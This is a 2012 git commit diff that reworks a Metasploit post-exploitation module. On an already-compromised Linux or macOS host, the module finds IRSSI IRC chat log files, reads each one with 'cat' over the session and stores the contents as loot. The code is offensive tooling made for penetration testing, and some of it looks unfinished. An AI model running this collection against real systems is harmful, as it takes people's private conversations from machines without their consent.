7eb5b1009cd049c4aab5f12caeb03ef3a3642bb7
Henry Hoggard <hoggardh@cardiff.ac.uk>
2012-05-08 15:51:23 +0100

    Fixed Error

--- enum_irssi.rb
+++ enum_irssi.rb
@@ -17,73 +17,62 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super(update_info(info,
-			'Name'          => 'Multi IRSSI Gather Enumeration',
+			'Name'          => 'IRSSI Log & Config Gather',
 			'Description'   => %q{
 					This module works on multiple platforms and gathers config and log files for IRSSI IRC client.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        => [ 'HenryHoggard'],
-			'Platform'      => [ 'linux', 'osx', 'windows' ],
+			'Platform'      => [ 'linux', 'osx', 'unix'],
 			'SessionTypes'  => [ "shell" ],
-			'Actions'       =>
-				[
-					['CONFIG', { 'Description' => 'Gather all config files' } ],
-					['LOGS',    { 'Description' => 'Gather all chat logs' } ],
-					['ALL',      { 'Description' => 'Gather both config files and chat logs'}]
-				],
-			'DefaultAction' => 'ALL'
+			
 		))
 
 	end
 
   def run
-      paths = []
-      user = whoami
+      print_status "Attempting to enumrate logs..."
+      @peer = "#{session.session_host}:#{session.session_port}"
+      user = session.shell_command("whoami").chomp
+      
       case session.platform
       
       when /unix|linux|bsd/
-        @platform = :unix
         path = "/home/#{user}/irclogs/"
       when /osx/
-        @platform = :osx
         path = "/Users/#{user}/irclogs/"
-        
-      when /win/
-        @platform = :windows
       else
         print_error "Unsupported platform #{session.platform}"
         return
       end
       
       irclogs = get_logs(path)
-      save(:irclogs, irclogs) if not irclogs.nil? and not irclogs.empty?
+      
         
       
       
   end
   
-  def whoami
-      if @platform == :windows
-        session.fs.file.expand_path("%USERNAME%")
-      else
-        session.shell_command("whoami").chomp
-      end
-  end
-  
+
   
   def get_logs(path)
     logs = cmd_exec("find #{path} -name '*.log'")
+    irc_logs = []
     logs.split("\n").each do |l|
-      print_status("#{peer} - Downloading#{l}")
+      print_status("#{@peer} - Downloading #{l}")
       content = cmd_exec("cat #{l}")
       name = ::File.basename(l)
       irc_logs << {:log_name => name, :content => content}
+      
+      loot = store_loot('IRSSI_LOOT', 'text/plain', session, content, "#{@peer}_#{l}", "Logs or Configs gathered from IRSSI")
+      print_good("#{@peer} - #{name} saved as #{loot}")
+			
     end
     return irc_logs
   end
     
 
-
+	
 
 end
     
